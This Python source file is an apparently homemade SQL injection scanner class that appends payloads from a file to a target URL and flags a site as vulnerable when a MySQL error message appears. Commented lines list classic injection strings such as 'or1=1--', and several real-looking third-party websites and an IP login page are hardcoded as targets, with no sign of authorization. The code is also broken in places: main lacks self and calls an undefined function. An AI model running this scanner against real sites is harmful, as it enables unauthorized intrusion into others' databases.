import sys
import os
import urllib.request

class Invpal_005:

    def __init__(self):
        """sql injection"""
        #self.fullurl = url

    def sql_injection(self,fullurl):

        #fullurl = input("URL: ")
        #fullurl = "http://www.romanianwriters.ro/s.php?id="
        #fullurl = "http://190.5.199.22:8082/RegistroSiag/Account/wfLogin.aspx?ReturnUrl=%2fRegistroSiag%2f"
        errormsg = "You have an error in your SQL syntax"
        #payloads = ["'admin'or1=1or''='","'=1\'or\'1\'=\'1\'","'or1=1","'1'or'1'=' 1","'or1=1#","'0'or'0'='0","'admin'or1=1or''='","'admin'or1=1","'admin'or'1'='1","'or1=1/*","'or1=1--"] #whatever payloads you want here ## YOU CAN ADD YOUR OWN
        errorr = "yes"
        fullbody= ""

        os.chdir("SQL_XSS")
        fname = "payloadSQL.txt"
        with open(fname) as f:
            content = f.readlines()    
        payloads = [x.strip() for x in content]


        for payload in payloads:
            try:
                payload = payload
                print(fullurl + payload)
                resp = urllib.request.urlopen(fullurl + payload)        
                body = resp.read()
                #print(body)
                fullbody = body.decode('utf-8')
                #print(fullbody)
            except:
                print("[-] Error! Manually check this payload: " + payload)
                #print(error)
                errorr = "no"
                #sys.exit()
            if errormsg in fullbody:
                if errorr == "no":
                    print("[-] That payload might not work!")
                    errorr = "yes"
                else:
                    print("[+] The website is SQL injection vulnerable! Payload: " + payload)
                    print(body)
            else:
                print("[-] The website is not SQL injection vulnerable!")

    def main():
    	url = "http://www.tunesoman.com/product.php?id="
    	sql(url)

        